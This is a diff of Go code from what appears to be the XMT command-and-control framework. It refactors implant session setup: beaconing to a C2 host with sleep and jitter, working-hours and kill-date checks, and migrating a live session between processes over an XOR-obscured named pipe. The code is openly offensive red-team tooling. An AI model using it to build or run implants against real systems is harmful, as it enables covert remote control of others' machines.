@@ -28,17 +28,21 @@ import (
 
 	"github.com/PurpleSec/logx"
 
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/com/pipe"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/data/crypto"
-	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/local"
 	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
+
+// Set this boolean to true to enable Sessions to directly quit on 'Connect*'
+// functions if the WorkHours is not met instead of waiting.
+const workHoursQuit = false
 
 var (
 	// ErrNoHost is an error returned by the Connect and Listen functions when
@@ -56,7 +60,7 @@ var (
 // register the device with the Server.
 //
 // This is used for spending specific data segments in single use connections.
-func Shoot(p Profile, n *com.Packet) error {
+func Shoot(p cfg.Profile, n *com.Packet) error {
 	return ShootContext(context.Background(), p, n)
 }
 
@@ -65,7 +69,7 @@ func Shoot(p Profile, n *com.Packet) error {
 //
 // A Session will be returned if the connection handshake succeeds, otherwise a
 // connection-specific error will be returned.
-func Connect(l logx.Log, p Profile) (*Session, error) {
+func Connect(l logx.Log, p cfg.Profile) (*Session, error) {
 	return ConnectContext(context.Background(), l, p)
 }
 
@@ -88,7 +92,7 @@ func Load(l logx.Log, n string, t time.Duration) (*Session, error) {
 // This is used for spending specific data segments in single use connections.
 //
 // This function version allows for setting the Context used.
-func ShootContext(x context.Context, p Profile, n *com.Packet) error {
+func ShootContext(x context.Context, p cfg.Profile, n *com.Packet) error {
 	if p == nil {
 		return ErrInvalidProfile
 	}
@@ -106,7 +110,6 @@ func ShootContext(x context.Context, p Profile, n *com.Packet) error {
 		n.Device = local.UUID
 	}
 	n.Flags |= com.FlagOneshot
-	// NOTE(dij): shouldn't this be controlled by the context?
 	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
 	err = writePacket(c, w, t, n)
 	if c.Close(); err != nil {
@@ -122,66 +125,8 @@ func ShootContext(x context.Context, p Profile, n *com.Packet) error {
 // connection-specific error will be returned.
 //
 // This function version allows for setting the Context passed to the Session.
-func ConnectContext(x context.Context, l logx.Log, p Profile) (*Session, error) {
-	if p == nil {
-		return nil, ErrInvalidProfile
-	}
-	h, w, t := p.Next()
-	if len(h) == 0 {
-		return nil, ErrNoHost
-	}
-	c, err := p.Connect(x, h)
-	if err != nil {
-		return nil, xerr.Wrap("unable to connect", err)
-	}
-	var (
-		s = &Session{ID: local.UUID, Device: local.Device.Machine}
-		n = &com.Packet{ID: SvHello, Device: local.UUID, Job: uint16(util.FastRand())}
-	)
-	s.host.Set(h)
-	if s.log, s.w, s.t, s.sleep = cout.New(l), w, t, p.Sleep(); s.sleep <= 0 {
-		s.sleep = DefaultSleep
-	}
-	if j := p.Jitter(); j >= 0 && j <= 100 {
-		s.jitter = uint8(j)
-	} else if j == -1 {
-		s.jitter = DefaultJitter
-	}
-	s.Device.MarshalStream(n)
-	// KeyCrypt: Generate initial key set here, append to the Packet.
-	//           This Packet is NOT encrypted.
-	if s.generateSessionKey(n); cout.Enabled {
-		s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
-	}
-	if bugtrack.Enabled {
-		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details [%v].", s.ID, s.key)
-	}
-	// Set an initial write deadline, to make sure that the connection is stable.
-	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
-	if err = writePacket(c, s.w, s.t, n); err != nil {
-		c.Close()
-		return nil, xerr.Wrap("first Packet write", err)
-	}
-	// Set an initial read deadline, to make sure that the connection is stable.
-	c.SetReadDeadline(time.Now().Add(spawnDefaultTime))
-	r, err := readPacket(c, s.w, s.t)
-	c.Close()
-	if n.Clear(); err != nil {
-		return nil, xerr.Wrap("first Packet read", err)
-	}
-	if r == nil || r.ID != SvComplete {
-		return nil, xerr.Sub("first Packet is invalid", 0x42)
-	}
-	if r.Clear(); cout.Enabled {
-		s.log.Info("[%s] Client connected to %q!", s.ID, h)
-	}
-	r, n = nil, nil
-	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
-	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
-	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
-	go s.listen()
-	go s.m.(eventer).listen(s)
-	return s, nil
+func ConnectContext(x context.Context, l logx.Log, p cfg.Profile) (*Session, error) {
+	return connectContextInner(x, nil, l, p)
 }
 
 // LoadContext will attempt to find a Session in another process or thread that
@@ -197,14 +142,11 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	if len(n) == 0 {
 		return nil, xerr.Sub("empty or invalid pipe name", 0x43)
 	}
-	if ProfileParser == nil {
-		return nil, xerr.Sub("no Profile parser loaded", 0x44)
-	}
 	if t == 0 {
 		t = spawnDefaultTime
 	}
 	if bugtrack.Enabled {
-		bugtrack.Track("c2.LoadContext(): Starting Pipe listen on %q.", n)
+		bugtrack.Track(`c2.LoadContext(): Starting Pipe listen on "%s"..`, n)
 	}
 	var (
 		y, f   = context.WithTimeout(x, t)
@@ -226,7 +168,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	select {
 	case c = <-z:
 		if bugtrack.Enabled {
-			bugtrack.Track("c2.LoadContext(): Received a connection on %q!.", n)
+			bugtrack.Track(`c2.LoadContext(): Received a connection on "%s"!.`, n)
 		}
 	case <-y.Done():
 	case <-x.Done():
@@ -239,80 +181,71 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, ErrNoConn
 	}
 	var (
-		w   = crypto.NewWriter(crypto.XOR(n), c)
-		r   = crypto.NewReader(crypto.XOR(n), c)
-		buf [8]byte
-		_   = buf[7]
+		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
+		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
+		j uint16
+		b []byte
 	)
 	// Set a connection deadline. I doubt this will fail, but let's be sure.
 	c.SetDeadline(time.Now().Add(spawnDefaultTime))
-	if err = readFull(r, 3, buf[0:3]); err != nil {
+	if err = r.ReadUint16(&j); err != nil {
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Read Job failed: %s", err.Error())
 		}
 		return nil, xerr.Wrap("read Job", err)
 	}
-	var (
-		u = uint16(buf[1]) | uint16(buf[0])<<8
-		g = buf[2] == 0xF && u == 0
-	)
-	b, err := readSlice(r, &buf)
-	if err != nil {
+	if err = r.ReadBytes(&b); err != nil {
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Read Profile failed: %s", err.Error())
 		}
 		return nil, xerr.Wrap("read Profile", err)
 	}
-	var p Profile
-	if p, err = ProfileParser(b); err != nil {
+	p, err := parseProfile(b)
+	if err != nil {
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): ParseProfile failed: %s", err.Error())
 		}
 		return nil, xerr.Wrap("parse Profile", err)
 	}
-	if bugtrack.Enabled {
-		bugtrack.Track("c2.LoadContext(): JobID %d, Spawn = %t.", u, g)
-	}
-	if b = nil; g { // Spawn
+	if j == 0 { // If JobID is zero, it's Spawn
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Starting Spawn!")
 		}
 		var s *Session
-		if s, err = ConnectContext(x, l, p); err == nil {
-			buf[0], buf[1] = 'O', 'K'
-			w.Write(buf[0:2])
+		if s, err = connectContextInner(x, r, l, p); err == nil {
+			w.WriteUint16(0x4F4B)
 		}
-		w.Close()
 		c.Close()
 		return s, err
 	}
-	var i device.ID
-	if err = i.Read(r); err != nil {
-		if c.Close(); bugtrack.Enabled {
-			bugtrack.Track("c2.LoadContext(): Read ID failed: %s", err.Error())
-		}
-		return nil, xerr.Wrap("read ID", err)
-	}
-	q, err := readProxyInfo(r, &buf)
-	if err != nil {
-		if c.Close(); bugtrack.Enabled {
-			bugtrack.Track("c2.LoadContext(): Read Proxy failed: %s", err.Error())
-		}
-		return nil, xerr.Wrap("read Proxy", err)
-	}
-	copy(local.UUID[:], i[:])
-	copy(local.Device.ID[:], i[:])
 	var (
-		s = &Session{ID: i, Device: local.Device.Machine}
-		h string
+		s Session
+		m []proxyData
 	)
-	// KeyCrypt: Migration data to transfer the Session key.
-	if err = readFull(r, data.KeySize, s.key[:]); err != nil {
-		if c.Close(); bugtrack.Enabled {
-			bugtrack.Track("c2.LoadContext(): Read Session Key failed: %s", err.Error())
-		}
-		return nil, xerr.Wrap("read Session Key", err)
+	if s.log, s.sleep = cout.New(l), p.Sleep(); s.sleep <= 0 {
+		s.sleep = cfg.DefaultSleep
 	}
+	if j := p.Jitter(); j >= 0 && j <= 100 {
+		s.jitter = uint8(j)
+	} else if j == -1 {
+		s.jitter = cfg.DefaultJitter
+	}
+	if k := p.KillDate(); k != nil && !k.IsZero() {
+		s.kill = k
+	}
+	if z := p.WorkHours(); z != nil && !z.Empty() {
+		s.work = z
+	}
+	if m, err = s.readDeviceInfo(infoMigrate, r); err != nil {
+		if c.Close(); bugtrack.Enabled {
+			bugtrack.Track("c2.LoadContext(): Read Device Info failed: %s", err.Error())
+		}
+		return nil, xerr.Wrap("read device info", err)
+	}
+	copy(local.UUID[:], s.ID[:])
+	copy(local.Device.ID[:], s.ID[:])
+	s.Device = local.Device.Machine
+	var h string
 	if h, s.w, s.t = p.Next(); len(h) == 0 {
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Empty/nil Host received.")
@@ -320,40 +253,31 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 		return nil, ErrNoHost
 	}
 	s.host.Set(h)
-	buf[0], buf[1], buf[2], buf[3] = 'O', 'K', 0, 0
-	if err = writeFull(w, 2, buf[0:2]); err != nil {
+	if err = w.WriteUint16(0x4F4B); err != nil {
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Write OK failed: %s", err.Error())
 		}
 		return nil, xerr.Wrap("write OK", err)
 	}
-	if err = readFull(r, 2, buf[2:4]); err != nil {
+	var k uint16
+	if err = r.ReadUint16(&k); err != nil {
 		if c.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Read OK failed: %s", err.Error())
 		}
-		return nil, xerr.Wrap("read OK", err)
+		return nil, xerr.Sub("read OK", 0x45)
 	}
-	w.Close()
-	if c.Close(); buf[2] != 'O' && buf[3] != 'K' {
+	if c.Close(); k != 0x4F4B { // 0x4F4B == "OK"
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): Bad OK value received.")
 		}
 		return nil, xerr.Sub("unexpected OK value", 0x45)
 	}
-	if s.log, s.sleep = cout.New(l), p.Sleep(); s.sleep <= 0 {
-		s.sleep = DefaultSleep
-	}
-	if j := p.Jitter(); j >= 0 && j <= 100 {
-		s.jitter = uint8(j)
-	} else if j == -1 {
-		s.jitter = DefaultJitter
-	}
 	var (
-		o = &com.Packet{ID: RvMigrate, Device: i, Job: u}
-		k net.Conn
+		o = &com.Packet{ID: RvResult, Device: s.ID, Job: j}
+		q net.Conn
 	)
-	s.Device.MarshalStream(o)
-	if k, err = p.Connect(x, s.host.String()); err != nil {
+	s.writeDeviceInfo(infoSyncMigrate, o) // We can't really write Proxy data yet, so let's sync this first.
+	if q, err = p.Connect(x, s.host.String()); err != nil {
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): First Connect failed: %s", err.Error())
 		}
@@ -362,18 +286,18 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	// KeyCrypt: Encrypt first packet
 	o.Crypt(&s.key)
 	// Set an initial write deadline, to make sure that the connection is stable.
-	k.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
-	if err = writePacket(k, s.w, s.t, o); err != nil {
-		if k.Close(); bugtrack.Enabled {
+	q.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
+	if err = writePacket(q, s.w, s.t, o); err != nil {
+		if q.Close(); bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): First Packet write failed: %s", err.Error())
 		}
 		return nil, xerr.Wrap("first Packet write", err)
 	}
 	o.Clear()
 	// Set an initial read deadline, to make sure that the connection is stable.
-	k.SetReadDeadline(time.Now().Add(spawnDefaultTime))
-	o, err = readPacket(k, s.w, s.t)
-	if k.Close(); err != nil {
+	q.SetReadDeadline(time.Now().Add(spawnDefaultTime))
+	o, err = readPacket(q, s.w, s.t)
+	if q.Close(); err != nil {
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): First Packet read failed: %s", err.Error())
 		}
@@ -384,22 +308,22 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
 	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
 	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
-	if err = receive(s, nil, o); err != nil {
+	if err = receive(&s, nil, o); err != nil {
 		if bugtrack.Enabled {
 			bugtrack.Track("c2.LoadContext(): First Receive failed: %s", err.Error())
 		}
 		return nil, xerr.Wrap("first receive", err)
 	}
-	if len(q) > 0 {
-		var z Profile
-		for i := range q {
-			if z, err = ProfileParser(q[i].p); err != nil {
+	if o = nil; len(m) > 0 {
+		var g cfg.Profile
+		for i := range m {
+			if g, err = parseProfile(m[i].p); err != nil {
 				if s.Close(); bugtrack.Enabled {
 					bugtrack.Track("c2.LoadContext(): Proxy Profile Parse failed: %s", err.Error())
 				}
 				return nil, xerr.Wrap("parse Proxy Profile", err)
 			}
-			if _, err = s.NewProxy(q[i].n, q[i].b, z); err != nil {
+			if _, err = s.NewProxy(m[i].n, m[i].b, g); err != nil {
 				if s.Close(); bugtrack.Enabled {
 					bugtrack.Track("c2.LoadContext(): Proxy Setup failed: %s", err.Error())
 				}
@@ -407,10 +331,104 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 			}
 		}
 	}
-	if bugtrack.Enabled {
+	if m = nil; bugtrack.Enabled {
 		bugtrack.Track("c2.LoadContext(): Done, Resuming operations!")
 	}
 	s.wait()
+	go s.listen()
+	go s.m.(eventer).listen(&s)
+	return &s, nil
+}
+func connectContextInner(x context.Context, r data.Reader, l logx.Log, p cfg.Profile) (*Session, error) {
+	if p == nil {
+		return nil, ErrInvalidProfile
+	}
+	h, w, t := p.Next()
+	if len(h) == 0 {
+		return nil, ErrNoHost
+	}
+	var (
+		s = &Session{ID: local.UUID, Device: local.Device.Machine}
+		n = &com.Packet{ID: SvHello, Device: local.UUID, Job: uint16(util.FastRand())}
+	)
+	if s.log, s.w, s.t, s.sleep = cout.New(l), w, t, p.Sleep(); s.sleep <= 0 {
+		s.sleep = cfg.DefaultSleep
+	}
+	if j := p.Jitter(); j >= 0 && j <= 100 {
+		s.jitter = uint8(j)
+	} else if j == -1 {
+		s.jitter = cfg.DefaultJitter
+	}
+	if k := p.KillDate(); k != nil && !k.IsZero() {
+		s.kill = k
+	}
+	if z := p.WorkHours(); z != nil && !z.Empty() {
+		s.work = z
+	}
+	if s.host.Set(h); r != nil {
+		if _, err := s.readDeviceInfo(infoSync, r); err != nil {
+			return nil, xerr.Wrap("read info failed", err)
+		}
+	} else if s.work != nil && !s.work.Empty() {
+		if v := s.work.Work(); v > 0 {
+			if workHoursQuit {
+				if cout.Enabled {
+					s.log.Warning(`[%s] WorkHours wanted to wait "%s", so we're exiting!`, s.ID, v.String())
+				}
+				return nil, xerr.Wrap("working hours not ready", context.DeadlineExceeded)
+			}
+			// NOTE(dij): I have to do this to allow the compiler to optimize it
+			//            out if it's enabled.
+			if !workHoursQuit {
+				if cout.Enabled {
+					s.log.Warning(`[%s] WorkHours waiting "%s" until connecting!`, s.ID, v.String())
+				}
+				time.Sleep(v)
+			}
+		}
+	}
+	if s.kill != nil && time.Now().After(*s.kill) {
+		if cout.Enabled {
+			s.log.Warning(`[%s] KillDate "%s" is after the current time, exiting!`, s.ID, s.kill.Format(time.UnixDate))
+		}
+		return nil, xerr.Wrap("killdate expired", context.DeadlineExceeded)
+	}
+	c, err := p.Connect(x, h)
+	if err != nil {
+		return nil, xerr.Wrap("unable to connect", err)
+	}
+	s.writeDeviceInfo(infoHello, n)
+	// KeyCrypt: Generate initial key set here, append to the Packet.
+	//           This Packet is NOT encrypted.
+	if s.generateSessionKey(n); cout.Enabled {
+		s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details %v.", s.ID, s.key)
+	}
+	// Set an initial write deadline, to make sure that the connection is stable.
+	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
+	if err = writePacket(c, s.w, s.t, n); err != nil {
+		c.Close()
+		return nil, xerr.Wrap("first Packet write", err)
+	}
+	// Set an initial read deadline, to make sure that the connection is stable.
+	c.SetReadDeadline(time.Now().Add(spawnDefaultTime))
+	v, err := readPacket(c, s.w, s.t)
+	c.Close()
+	if n.Clear(); err != nil {
+		return nil, xerr.Wrap("first Packet read", err)
+	}
+	if v == nil || v.ID != SvComplete {
+		return nil, xerr.Sub("first Packet is invalid", 0x42)
+	}
+	if v.Clear(); cout.Enabled {
+		s.log.Info(`[%s] Client connected to "%s"!`, s.ID, h)
+	}
+	r, n = nil, nil
+	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
+	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
+	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
 	go s.listen()
 	go s.m.(eventer).listen(s)
 	return s, nil
@@ -429,7 +447,7 @@ func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Ses
 //
 // A Session will be returned if the connection handshake succeeds, otherwise a
 // connection-specific error will be returned.
-func LoadOrConnect(x context.Context, l logx.Log, n string, t time.Duration, p Profile) (*Session, error) {
+func LoadOrConnect(x context.Context, l logx.Log, n string, t time.Duration, p cfg.Profile) (*Session, error) {
 	if s, _ := LoadContext(x, l, n, t); s != nil {
 		return s, nil
 	}
